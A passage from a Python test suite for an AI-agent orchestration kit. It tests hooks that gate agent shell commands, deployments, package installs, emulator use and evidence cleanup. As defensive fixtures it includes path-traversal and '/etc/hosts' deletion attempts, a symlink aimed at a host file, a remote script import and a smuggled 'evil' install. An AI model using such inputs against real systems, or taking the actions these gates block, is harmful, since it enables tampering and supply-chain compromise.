        stray = os.path.join(os.path.dirname(avd_home), "elsewhere", "x.png")
        r = gate("Write", {"file_path": stray}, proj, extra=env)
        assert r.returncode == 2, "the carve-out must not widen further"


def test_self_scan_skips_gitignored_build_output_only():
    # DEBT-0009 (2026-08-10): gradle's problems-report.html under generated
    # app/android/build/ is a true remote-code-load match and a false
    # finding about the product — 32 findings, scans red in the primary.
    # The product's own .gitignore is the honest invariant (no directory
    # list to keep current); the same bytes in first-party source still
    # flag, and with no git answer the scan fails OPEN.
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan
    report = ("<html><script src=\"https://docs.gradle.org/x.js\">"
              "</script></html>\n")
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        rep = os.path.join(tmp, "app", "android", "build", "reports",
                           "problems-report.html")
        os.makedirs(os.path.dirname(rep))
        with open(rep, "w") as f:
            f.write(report)
        with open(os.path.join(tmp, ".gitignore"), "w") as f:
            f.write("app/android/\n")
        first_party = os.path.join(tmp, "app", "take.js")
        with open(first_party, "w") as f:
            f.write('import x from "https://cdn.example.com/x.js";\n')
        orig = self_scan.lib.default_scope
        self_scan.lib.default_scope = lambda: ["app"]
        try:
            # no git repo: check-ignore cannot answer -> fail open, both flag
            found = self_scan.scan_js_bound(tmp)
            assert any("app/take.js" in f for f in found), found
            assert any("problems-report.html" in f for f in found), found
            subprocess.run(["git", "-C", tmp, "init", "-q"], check=True,
                           capture_output=True)
            found = self_scan.scan_js_bound(tmp)
            assert any("app/take.js" in f for f in found), found
            assert not any("problems-report.html" in f for f in found), \
                "gitignored build output must be skipped: %s" % found
        finally:
            self_scan.lib.default_scope = orig


def test_ci_scope_widens_change_detection():
    # 2026-08-10: a transcription/ commit reddened tools/ tests while the
    # gate watched app/ only — reddening commit, reddened tests, and watched
    # scope were three disjoint directories, and ci_state said green over
    # 29 unaccounted failures. ci_scope widens CHANGE DETECTION without
    # touching product_dir (which also feeds scopes/probes/self-scan).
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        base = "builders: 1\nproduct_dir: app\nci_command: python3 -c pass\n"
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write(base)
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "green", out
        os.makedirs(os.path.join(tmp, "tools"))
        with open(os.path.join(tmp, "tools", "checks.py"), "w") as f:
            f.write("OK = 1\n")
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True,
                       capture_output=True)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "-m", "tools"],
                       check=True, capture_output=True)
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "skipped", \
            "product_dir-only watch cannot see tools/: %s" % out
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write(base + "ci_scope: app,tools\n")
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "green", \
            "widened scope must notice the tools/ change: %s" % out
        with open(os.path.join(tmp, "tools", "checks.py"), "w") as f:
            f.write("OK = 2\n")
        subprocess.run(["git", "-C", tmp, "commit", "-aqm", "change"],
                       check=True, capture_output=True)
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "green", \
            "a later tools/ change must re-trigger: %s" % out


def test_untracked_factory_paths_reported_at_session_start():
    # 2026-08-11: the verifier's designated "durable record" path was itself
    # gitignored in the product — two device walks' findings survive only
    # where they were transcribed into tickets. The kit cannot know a
    # product's ignore policy; git can. Report once per session, never
    # override.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(tmp, ".gitignore"), "a") as f:
            f.write("agenticflow/tracker/notes/\n")
        plan = json.loads(_run(af, "dispatch.py"))
        assert not any(f["kind"] == "untracked_factory_paths"
                       for f in plan["flags"]), "mid-run ticks stay quiet"
        plan = json.loads(_run(af, "dispatch.py", "--session-start"))
        hits = [f for f in plan["flags"]
                if f["kind"] == "untracked_factory_paths"]
        assert len(hits) == 1, plan["flags"]
        assert hits[0]["paths"] == ["agenticflow/tracker/notes"], hits


def test_compact_flag_reports_whole_history_not_the_delta():
    # KV TASK-0071 (2026-08-11): history_bytes reported the post-summary
    # delta (3,937) of a 13,685-byte History — needed compactions were never
    # re-dispatched, silently. The whole section is the quantity a compactor
    # must fit under the bar; the delta rides along as new_since_compaction;
    # raise-compact-threshold is the sanctioned anti-treadmill brake.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", history=(
            "- 2026-01-01T00:00:00Z [compactor] summary: " + "s" * 11000
            + " [compacted → agenticflow/tracker/notes/TASK-0001.md]\n"
            "- 2026-01-02T00:00:00Z [builder-1] new fact\n"
            "- 2026-01-03T00:00:00Z [qa] another new fact"))
        plan = json.loads(_run(af, "dispatch.py"))
        hits = [f for f in plan["flags"]
                if f["kind"] == "compact_candidate" and f["id"] == "TASK-0001"]
        assert len(hits) == 1, plan["flags"]
        assert hits[0]["history_bytes"] > 11000, hits
        assert hits[0]["new_since_compaction"] < 2000, hits


def test_amend_description_corrects_the_first_paragraph():
    # KV BUG-0066 (2026-08-11): a measurably false Description claim could
    # not be corrected by any role — the fix built against a correction
    # banner further down the file. Architect/human only; the receipt
    # survives (prose is not the bar); old text lands in History bounded.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "t",
             "--as", "architect", "--description",
             "the button unlights because nothing ever lit it",
             "--criteria", "`test -f app/main.py` exits 0")
        rp = os.path.join(af, "tracker", "receipts", "TASK-0001.json")
        with open(rp, "w") as f:
            json.dump({"green": True}, f)
        tp = os.path.join(af, "scripts", "ticket.py")
        r = subprocess.run([sys.executable, tp, "amend-description",
                            "TASK-0001", "--description", "x",
                            "--as", "builder-1", "--note", "n"],
                           capture_output=True, text=True)
        assert r.returncode != 0 and "architect" in r.stderr, r.stderr
        _run(af, "ticket.py", "amend-description", "TASK-0001",
             "--description",
             "the button LIGHTS and sticks lit; nothing ever unlights it",
             "--as", "architect", "--note", "QA framebuffer refuted the claim")
        body = open(os.path.join(af, "tracker", "tickets", "TASK-0001.md"),
                    encoding="utf-8").read()
        desc = re.search(r"## Description\n(.*?)(?=\n## )", body,
                         re.DOTALL).group(1)
        assert "sticks lit" in desc and "nothing ever lit it" not in desc
        assert "description amended: QA framebuffer" in body
        assert "[was: " in body
        assert os.path.exists(rp), "amending prose must not void the receipt"


def test_ledger_notes_stranded_returns():
    # KV 2026-08-11: QA's red pins died uncommitted in the primary checkout
    # twice — the dispatcher hand-authored the commits, and one builder was
    # briefed on a test that existed on one disk only. A returning agent
    # that leaves the primary dirty (tracker excluded) earns one '#' ledger
    # line, which every consumer skips by contract.
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        for args in (["init", "-q"], ["config", "user.email", "t@t"],
                     ["config", "user.name", "t"]):
            subprocess.run(["git", "-C", proj] + args, check=True,
                           capture_output=True)
        open(os.path.join(tracker, "RUNNING"), "w").close()
        stop = {"hook_event_name": "SubagentStop", "agent_type": "qa-adversary",
                "agent_transcript_path": os.path.join(proj, "absent.jsonl")}
        log = os.path.join(tracker, "spawn_log.tsv")
        os.makedirs(os.path.join(proj, "app"))
        with open(os.path.join(proj, "app", "pin.test.js"), "w") as f:
            f.write("test stub\n")
        _hook(LEDGER, stop, proj)
        text = open(log).read()
        assert "# STRANDED" in text and "app/pin.test.js" in text, text
        subprocess.run(["git", "-C", proj, "add", "-A"], check=True,
                       capture_output=True)
        subprocess.run(["git", "-C", proj, "commit", "-qm", "x"], check=True,
                       capture_output=True)
        with open(os.path.join(tracker, "notes.md"), "w") as f:
            f.write("dispatcher business\n")  # tracker paths are exempt
        before = open(log).read().count("# STRANDED")
        _hook(LEDGER, stop, proj)
        assert open(log).read().count("# STRANDED") == before, \
            "a tracker-only dirty tree must not flag"


def test_ledger_regex_stamps_debt():
    # DEBT was missing from TICKET_RE for the ledger's whole history — DEBT
    # agents were stamped with whatever other ID appeared first, or '-'.
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        open(os.path.join(tracker, "RUNNING"), "w").close()
        spawn = {"hook_event_name": "PreToolUse",
                 "tool_input": {"subagent_type": "builder",
                                "description": "builder works DEBT-0012",
                                "prompt": "packet"}}
        _hook(LEDGER, spawn, proj)
        rows = [ln.rstrip("\n").split("\t")
                for ln in open(os.path.join(tracker, "spawn_log.tsv"))]
        assert rows[0][1:] == ["builder", "DEBT-0012", "spawned"], rows


def test_qa_reoffer_suppressed_while_lane_lives():
    # KV BUG-0050 (2026-08-11): qa_batches re-offered a ticket for three
    # hours while a QA lane attacked it; the dispatcher read silence as
    # death and paid 61,879 tokens for a duplicate that learned nothing.
    # Under qa_relaunch_minutes the offer is withheld; past it the offer
    # stands with the cost stated.
    from datetime import datetime, timedelta, timezone
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", status="built")
        ledger = os.path.join(af, "tracker", "spawn_log.tsv")
        fresh = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        with open(ledger, "w") as f:
            f.write("%s\tqa-adversary\tTASK-0001\tspawned\n" % fresh)
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [], plan["qa_batches"]
        assert any(f["kind"] == "qa_in_flight" and f["id"] == "TASK-0001"
                   for f in plan["flags"]), plan["flags"]
        stale = (datetime.now(timezone.utc) - timedelta(hours=3)) \
            .strftime("%Y-%m-%dT%H:%M:%SZ")
        with open(ledger, "w") as f:
            f.write("%s\tqa-adversary\tTASK-0001\tspawned\n" % stale)
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [["TASK-0001"]], plan["qa_batches"]
        hits = [f for f in plan["flags"] if f["kind"] == "qa_overrun"]
        assert len(hits) == 1 and hits[0]["oldest_minutes"] >= 175, hits


def test_empty_diff_union_covers_out_of_product_scope():
    # KV BUG-0056 (2026-08-11): a 233-line landed diff took an empty_diffs
    # strike (breaker budget) because the worktree claim hash covered
    # product_dir only — the ticket's whole scope lived in tools/ and docs/.
    # The hash is now the union of product tree and declared scope.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        os.makedirs(os.path.join(tmp, "tools"))
        with open(os.path.join(tmp, "tools", "x.py"), "w") as f:
            f.write("RULE = 1\n")
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True,
                       capture_output=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "tools"],
                       check=True, capture_output=True)
        for tid in ("TASK-0001", "TASK-0002"):
            _raw_ticket(af, tid, scope="tools/x.py")
        _run(af, "dispatch.py")            # creates both worktrees
        for tid in ("TASK-0001", "TASK-0002"):
            _run(af, "ticket.py", "claim", tid, "--as", "builder-1")
            if tid == "TASK-0001":
                with open(os.path.join(af, ".worktrees", tid, "tools",
                                       "x.py"), "w") as f:
                    f.write("RULE = 2\n")
            _run(af, "ticket.py", "transition", tid, "built",
                 "--as", "builder-1", "--note", "n")
        front = lambda tid: lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", tid + ".md"))["front"]
        assert not front("TASK-0001").get("empty_diffs"), \
            "a real out-of-product diff must not strike"
        assert front("TASK-0002").get("empty_diffs") == 1, \
            "a genuinely empty handoff still strikes"


def test_sibling_stamp_on_shared_provenance_and_scope():
    # KV 2026-08-11: four consecutive cross-role duplicate filings each
    # carried something the first could not — the waste was the freeze and
    # the cold adjudication, not the second diagnosis. Same discovered_from
    # AND intersecting scope stamps both tickets `siblings:`; different
    # provenance stays silent (scope alone is 9x noisier, measured).
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")
        _run(af, "ticket.py", "new", "--type", "BUG", "--title", "ruling",
             "--as", "architect", "--scope", "app/main.py",
             "--discovered-from", "TASK-0009",
             "--criteria", "`test -f app/main.py` exits 0")
        r = subprocess.run([sys.executable, tp, "new", "--type", "BUG",
                            "--title", "measurement", "--as", "qa",
                            "--scope", "app/main.py",
                            "--discovered-from", "TASK-0009",
                            "--criteria", "`test -f app/main.py` exits 0"],
                           capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        assert "SIBLING:" in r.stderr and "BUG-0001" in r.stderr, r.stderr
        front = lambda tid: lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", tid + ".md"))["front"]
        assert front("BUG-0001").get("siblings") == ["BUG-0002"]
        assert front("BUG-0002").get("siblings") == ["BUG-0001"]
        r = subprocess.run([sys.executable, tp, "new", "--type", "BUG",
                            "--title", "unrelated", "--as", "qa",
                            "--scope", "app/main.py",
                            "--discovered-from", "TASK-0031",
                            "--criteria", "`test -f app/main.py` exits 0"],
                           capture_output=True, text=True)
        assert r.returncode == 0 and "SIBLING:" not in r.stderr, r.stderr
        assert not front("BUG-0003").get("siblings")


def test_emu_lease_one_slot_ttl_and_steal():
    # 2026-08-11: two factories each ran an emulator and the machine ran out
    # of RAM. Emulator count is MACHINE state: one slot (default) across all
    # factories, TTL-bounded turns, and an expired lease's emulator is fair
    # game — the next acquirer kills the RECORDED pid and takes the slot.
    import time as _time
    with tempfile.TemporaryDirectory() as h, \
            tempfile.TemporaryDirectory() as ta, \
            tempfile.TemporaryDirectory() as tb:
        env = dict(os.environ, AGENTICFLOW_HOME=os.path.realpath(h))
        af_a = _factory_repo(os.path.realpath(ta))
        af_b = _factory_repo(os.path.realpath(tb))
        lease = lambda af, *args: subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "emu_lease.py")]
            + list(args), capture_output=True, text=True, env=env)
        r = lease(af_a, "acquire", "--role", "qa", "--ticket", "BUG-0001")
        assert r.returncode == 0 and "lease granted" in r.stdout, r.stderr
        fake_emu = subprocess.Popen([sys.executable, "-c",
                                     "import time; time.sleep(300)"])
        try:
            r = lease(af_a, "register", "--serial", "emulator-5600",
                      "--pid", str(fake_emu.pid))
            assert r.returncode == 0, r.stderr
            # second factory: denied while the slot is fresh
            r = lease(af_b, "acquire", "--role", "builder")
            assert r.returncode == 1 and "DENIED" in r.stderr, r.stderr
            # re-acquire by the holder is idempotent, not a second slot
            r = lease(af_a, "acquire", "--role", "qa", "--ticket", "BUG-0001")
            assert r.returncode == 0 and "already held" in r.stdout, r.stdout
            # expiry: the recorded emulator is killed, the slot changes hands
            path = os.path.join(env["AGENTICFLOW_HOME"], "emulator.lease.0")
            body = json.load(open(path))
            body["acquired_epoch"] = _time.time() - 3600
            with open(path, "w") as f:
                json.dump(body, f)
            r = lease(af_b, "acquire", "--role", "builder")
            assert r.returncode == 0 and "stole expired lease" in r.stderr, r
            for _ in range(50):
                if fake_emu.poll() is not None:
                    break
                _time.sleep(0.1)
            assert fake_emu.poll() is not None, \
                "the expired holder's emulator must be killed"
            r = lease(af_b, "release")
            assert r.returncode == 0 and not os.path.exists(path), r.stdout
        finally:
            if fake_emu.poll() is None:
                fake_emu.kill()


def test_needs_device_stamps_flags_contention_and_marks_index():
    # Device need discovered mid-lane is the expensive way to find out
    # (Ben, 2026-08-11): the architect stamps it at authoring, the packet
    # carries it, and the dispatcher is warned — guidance, never a gate —
    # when more than one device-stamped lane would queue at the lease.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "walk one",
             "--as", "architect", "--needs-device",
             "--criteria", "`test -f app/main.py` exits 0")
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "TASK-0001.md"))["front"]
        assert front.get("needs_device") is True
        plan = json.loads(_run(af, "dispatch.py"))
        assert not any(f["kind"] == "device_contention"
                       for f in plan["flags"]), "one device lane is fine"
        assert "DEVICE" in open(os.path.join(af, "tracker",
                                             "INDEX.md")).read()
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "walk two",
             "--as", "architect", "--needs-device",
             "--criteria", "`test -f app/main.py` exits 0")
        plan = json.loads(_run(af, "dispatch.py"))
        hits = [f for f in plan["flags"] if f["kind"] == "device_contention"]
        assert len(hits) == 1, plan["flags"]
        assert hits[0]["ids"] == ["TASK-0001", "TASK-0002"], hits
        # an unstamped ticket never counts toward contention
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "no device",
             "--as", "architect",
             "--criteria", "`test -f app/main.py` exits 0")
        plan = json.loads(_run(af, "dispatch.py"))
        hits = [f for f in plan["flags"] if f["kind"] == "device_contention"]
        assert hits[0]["ids"] == ["TASK-0001", "TASK-0002"], hits


def test_emu_lease_wait_blocks_until_the_slot_frees():
    # "Denied agents don't spin" was the wrong clause (Ben, 2026-08-11):
    # waiting your turn is the normal move. --wait blocks inside one call,
    # bounded by the holder's TTL — here the holder's lease expires seconds
    # in, and the waiter is granted without any agent-level retry logic.
    import time as _time
    with tempfile.TemporaryDirectory() as h, \
            tempfile.TemporaryDirectory() as ta, \
            tempfile.TemporaryDirectory() as tb:
        env = dict(os.environ, AGENTICFLOW_HOME=os.path.realpath(h))
        af_a = _factory_repo(os.path.realpath(ta))
        af_b = _factory_repo(os.path.realpath(tb))
        lease = lambda af, *args: subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "emu_lease.py")]
            + list(args), capture_output=True, text=True, env=env)
        r = lease(af_a, "acquire", "--role", "qa")
        assert r.returncode == 0, r.stderr
        # holder's lease has ~4 seconds left
        path = os.path.join(env["AGENTICFLOW_HOME"], "emulator.lease.0")
        body = json.load(open(path))
        body["acquired_epoch"] = _time.time() - 30 * 60 + 4
        with open(path, "w") as f:
            json.dump(body, f)
        t0 = _time.time()
        r = lease(af_b, "acquire", "--role", "builder", "--wait",
                  "--timeout-minutes", "1")
        assert r.returncode == 0 and "lease granted" in r.stdout, r.stderr
        assert "waiting for a slot" in r.stderr, r.stderr
        assert _time.time() - t0 < 45, "the wait must end at expiry, not timeout"
        held = json.load(open(path))
        assert os.path.abspath(held["project"]) == \
            os.path.abspath(os.path.dirname(af_b))


def test_artifact_gate_gates_unleased_emulator_boots():
    # Booting the SDK emulator without a live lease held by THIS project is
    # refused (wrappers like nohup included); a fresh lease admits it, a
    # foreign or expired one does not, and the word 'emulator' in ordinary
    # commands stays free.
    import time as _time
    def gate(cmd, proj, env_extra):
        payload = json.dumps({"tool_name": "Bash",
                              "tool_input": {"command": cmd}, "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj, **env_extra)
        return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                              capture_output=True, text=True, env=env)
    with tempfile.TemporaryDirectory() as proj, \
            tempfile.TemporaryDirectory() as h:
        proj = os.path.realpath(proj)
        extra = {"AGENTICFLOW_HOME": os.path.realpath(h)}
        os.makedirs(os.path.join(proj, "agenticflow", "tracker"))
        open(os.path.join(proj, "agenticflow", "tracker", "RUNNING"),
             "w").close()
        boot = "nohup %s/sdk/emulator/emulator @qa_walk -no-window -port 5600" \
            % proj
        r = gate(boot, proj, extra)
        assert r.returncode == 2 and "emu_lease.py" in r.stderr, r.stderr
        assert gate("echo the emulator @home is fine", proj,
                    extra).returncode == 0
        lease = os.path.join(extra["AGENTICFLOW_HOME"], "emulator.lease.0")
        body = {"project": proj, "acquired_epoch": _time.time(),
                "ttl_minutes": 30}
        with open(lease, "w") as f:
            json.dump(body, f)
        assert gate(boot, proj, extra).returncode == 0, "leased boot passes"
        body["project"] = "/somewhere/else"
        with open(lease, "w") as f:
            json.dump(body, f)
        assert gate(boot, proj, extra).returncode == 2, \
            "a foreign lease admits nothing"
        body["project"], body["acquired_epoch"] = proj, _time.time() - 3600
        with open(lease, "w") as f:
            json.dump(body, f)
        assert gate(boot, proj, extra).returncode == 2, \
            "an expired lease admits nothing"


def test_evidence_clean_is_bounded_to_the_evidence_dir():
    # 2026-08-11: agents improvised raw `rm` for the mandated evidence
    # cleanup and the human was prompted every time. evidence_clean.py is
    # the allowlisted form: only files inside evidence/<owner>, no absolute
    # or .. patterns, directories never removed, symlinks deleted as links.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        ev = os.path.join(af, "tracker", "evidence", "BUG-0001")
        os.makedirs(os.path.join(ev, "qa"))
        other = os.path.join(af, "tracker", "evidence", "BUG-0002")
        os.makedirs(other)
        for rel in ("fb.raw", "emu.log", "crop.png", "qa/probe.raw"):
            with open(os.path.join(ev, rel), "w") as f:
                f.write("x" * 100)
        with open(os.path.join(other, "keep.raw"), "w") as f:
            f.write("not yours")
        outside = os.path.join(tmp, "precious.txt")
        with open(outside, "w") as f:
            f.write("host file")
        os.symlink(outside, os.path.join(ev, "sneaky.raw"))
        ec = lambda *args: subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "evidence_clean.py")]
            + list(args), capture_output=True, text=True)
        r = ec("BUG-0001", "*.raw", "emu.log", "qa/*.raw", "*.absent")
        assert r.returncode == 0, r.stderr
        for gone in ("fb.raw", "emu.log", "qa/probe.raw", "sneaky.raw"):
            assert not os.path.lexists(os.path.join(ev, gone)), gone
        assert os.path.exists(os.path.join(ev, "crop.png")), "kept file"
        assert os.path.exists(outside), \
            "deleting a symlink must never touch its target"
        assert os.path.exists(os.path.join(other, "keep.raw")), \
            "another ticket's evidence is out of reach"
        assert "crop.png" in r.stdout and "remaining" in r.stdout
        for bad in (("BUG-0001", "/etc/hosts"),
                    ("BUG-0001", "../BUG-0002/keep.raw"),
                    ("no-such-owner", "*.raw")):
            r = ec(*bad)
            assert r.returncode != 0, bad
        assert os.path.exists(os.path.join(other, "keep.raw"))


def test_remote_gate_staging_free_undeclared_and_prod_blocked():
    # Services seam (Ben, 2026-08-11): this phase is ALL STAGING — declared
    # services pass freely (zero velocity cost), undeclared CLIs are the
    # provisioning fence (human creates accounts, never agents), and
    # anything named prod/production is refused until a promotion flow
    # exists. Only gated while RUNNING exists.
    REMOTE = os.path.join(lib.PRODUCT, ".claude", "hooks", "remote_gate.py")
    def gate(cmd, proj):
        payload = json.dumps({"tool_name": "Bash",
                              "tool_input": {"command": cmd}, "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)
        return subprocess.run([sys.executable, REMOTE], input=payload,
                              capture_output=True, text=True, env=env)
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        os.makedirs(os.path.join(proj, "agenticflow", "tracker"))
        os.makedirs(os.path.join(proj, "agenticflow", "docs"))
        boot = "railway up --service api"
        assert gate(boot, proj).returncode == 0, "no RUNNING: not gated"
        open(os.path.join(proj, "agenticflow", "tracker", "RUNNING"),
             "w").close()
        r = gate(boot, proj)
        assert r.returncode == 2 and "not declared" in r.stderr, r.stderr
        with open(os.path.join(proj, "agenticflow", "docs", "SERVICES.md"),
                  "w") as f:
            f.write("# services\n\n## railway\n- staging target: notes-stg\n")
        cases = [
            ("railway up --service api", 0),          # declared staging
            ("npx supabase db push", 2),              # undeclared, npx form
            ("railway up --environment production", 2),   # prod always
            ("railway logs --service prod-api", 2),   # the word is the fence
            ("echo railway is a train company", 0),   # not the CLI
            ("git push && railway up", 0),            # declared in compound
        ]
        for cmd, want in cases:
            r = gate(cmd, proj)
            assert r.returncode == want, (cmd, r.returncode, r.stderr)
        r = gate("railway up --environment production", proj)
        assert "human-gated" in r.stderr, r.stderr


def test_qa_batch_patience_holds_lone_low_priority_tickets():
    # KV: 124 QA spawns for 142 builds — batches of one. With patience set,
    # a lone built P2 whose sibling is still claimed waits (qa_batch_waiting
    # flag, no offer); when patience runs out it offers anyway; P0 never
    # waits; a ticket with no batch-mates in flight never waits.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("builders: 4\nproduct_dir: app\nqa_batch_patience: 2\n")
        _raw_ticket(af, "FEAT-0001", ttype="feat")
        _raw_ticket(af, "TASK-0002", status="built", parent="FEAT-0001")
        _raw_ticket(af, "TASK-0003", status="claimed", parent="FEAT-0001",
                    claimed_at="2026-01-01T00:00:00Z", assignee="builder-1")
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [], plan["qa_batches"]
        assert any(f["kind"] == "qa_batch_waiting" and f["id"] == "TASK-0002"
                   for f in plan["flags"]), plan["flags"]
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [], "second tick still waiting"
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [["TASK-0002"]], \
            "patience exhausted -> offered: %s" % plan["qa_batches"]
        # P0 never waits, even with a sibling in flight
        _raw_ticket(af, "BUG-0004", status="built", parent="FEAT-0001")
        p0 = os.path.join(af, "tracker", "tickets", "BUG-0004.md")
        raw = open(p0).read().replace("priority: P2", "priority: P0")
        open(p0, "w").write(raw)
        plan = json.loads(_run(af, "dispatch.py"))
        assert ["BUG-0004", "TASK-0002"] in plan["qa_batches"] \
            or ["BUG-0004"] in [sorted(b) for b in plan["qa_batches"]], \
            plan["qa_batches"]
        # no batch-mates in flight -> no wait at all
        _raw_ticket(af, "TASK-0005", status="built")
        plan = json.loads(_run(af, "dispatch.py"))
        assert ["TASK-0005"] in plan["qa_batches"], plan["qa_batches"]


def test_artifact_gate_tokenizes_shell_operators():
    # kspace 2026-08-29: shlex.split only splits `;` `&&` `|` when they are
    # whitespace-delimited, so `foo > /tmp/x; bar` yielded the token
    # '/tmp/x;' and never ended the segment — the cp/mv arm then swept past
    # the operator and blocked agenticflow/scripts/dispatch.py as an mv
    # destination (twice), and 17 fires recorded a target ending in ';'.
    sys.path.insert(0, os.path.dirname(ARTIFACT_GATE))
    import artifact_gate as ag
    got = ag.bash_write_targets("mv a b; python3 agenticflow/scripts/dispatch.py --tick")
    assert "agenticflow/scripts/dispatch.py" not in got, got
    assert ag.bash_write_targets("echo hi > /tmp/x; echo bye") == ["/tmp/x"]
    assert ag.bash_write_targets("cp x y && cat /some/where)") == ["y"]
    assert ag.bash_write_targets("cmd 2>&1 | tee out.txt") == ["&", "out.txt"]
    assert ag.bash_write_targets("(cd app; make) && cp a b") == ["b"]
    with tempfile.TemporaryDirectory() as proj:
        proj = os.path.realpath(proj)
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(trk)
        open(os.path.join(trk, "RUNNING"), "w").close()
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)

        def gate(cmd):
            payload = json.dumps({"tool_name": "Bash", "cwd": proj,
                                  "tool_input": {"command": cmd}})
            return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                                  capture_output=True, text=True, env=env)
        r = gate("mv a b; python3 agenticflow/scripts/dispatch.py --tick")
        assert r.returncode == 0, r.stderr
        r = gate("echo hi > /tmp/x; echo bye")
        assert r.returncode == 2 and "/tmp/x;" not in r.stderr, r.stderr


def test_supply_gate_pip_extras_and_heredoc_prose():
    # kspace 2026-08-28/29: `psycopg[binary]==3.3.4` (pinned, vetted) was
    # refused because extras were stripped only when the bracket ENDED the
    # token; and a heredoc writing markdown ABOUT installs was refused as an
    # install of the packages "name, against, the, default, PyPI".
    verb = "pip" + " install"
    with tempfile.TemporaryDirectory() as proj:
        os.makedirs(os.path.join(proj, "agenticflow", "docs"))
        with open(os.path.join(proj, "agenticflow", "docs",
                               "ALLOWED_DEPS.md"), "w") as f:
            f.write("- psycopg (>=3.3,<3.4)\n")
        cases = [
            (verb + " 'psycopg[binary]==3.3.4'", 0),
            (verb + " psycopg[binary]==3.3.4", 0),
            (verb + " psycopg[binary]", 2),           # unpinned: still refused
            (verb + " psycopg[binary]==9.9.9", 2),    # outside range: still refused
            ("cat > doc.md <<'EOF'\nRun " + verb
             + " name against the default PyPI index\nEOF\n", 0),
            ("cat <<EOF > doc.md\n" + verb + " evil\nEOF\n" + verb + " evil", 2),
        ]
        for cmd, want in cases:
            got = _gate(cmd, proj)
            assert got == want, (cmd, got, want)


def test_qa_evidence_overbudget_is_counted_not_refused():
    # Ben, 2026-08-29: QA evidence notes are budgeted (<=1,500 chars); three
    # returns measured 1,681-1,786 and nothing counted them. A refusal here
    # would block a close over prose, so the overrun is a gate_fires row.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        with open(os.path.join(af, "run.yaml"), "a") as f:
            f.write("qa_evidence_max_chars: 100\n")
        _raw_ticket(af, "TASK-0001", status="qa")
        _run(af, "ticket.py", "transition", "TASK-0001", "reopened",
             "--as", "qa", "--note", "x" * 150)
        fires = open(os.path.join(af, "tracker", "gate_fires.tsv")).read()
        assert "evidence_budget\tqa_evidence_overbudget: TASK-0001 150/100" \
            in fires, fires


def test_receipt_runs_checks_in_a_private_worktree():
    # kspace 2026-08-28 (nine filings, one defect): lanes share the primary
    # checkout, so a whole-tree check saw other lanes' untracked scratch —
    # TASK-0027's receipt flapped RED/GREEN on nothing of its own. The
    # checks now run in a throwaway worktree at HEAD; the receipt records
    # what it was shielded from.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        path = _raw_ticket(af, "TASK-0001", status="qa")
        body = open(path).read().replace(
            "## History",
            "## Checks\n```sh\ntest ! -e stray.txt\ntest -f app/main.py\n```\n\n"
            "## History")
        with open(path, "w") as f:
            f.write(body)
        with open(os.path.join(tmp, "stray.txt"), "w") as f:
            f.write("another lane's scratch\n")
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "receipt.py"),
